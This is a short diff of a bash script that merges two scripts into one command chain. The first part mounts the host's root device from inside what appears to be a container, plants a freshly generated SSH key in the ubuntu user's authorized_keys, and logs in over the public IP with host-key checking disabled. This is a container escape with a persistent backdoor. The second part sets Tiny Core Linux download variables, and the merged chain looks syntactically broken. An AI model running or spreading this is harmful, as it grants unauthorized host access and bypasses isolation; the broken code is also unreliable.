@@ -1,12 +1,9 @@
 #!/bin/bash
-
-# === SCRIPT 1 ===
 cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; ip=$(curl -s ifconfig.me) && \
 ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa  ; \
 echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && \
 ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip \
-
-# === SCRIPT 2 ===
+&&
 TCE_VERSION="14.x"
 ARCH="x86_64"
 TCE_MIRROR="http://tinycorelinux.net"
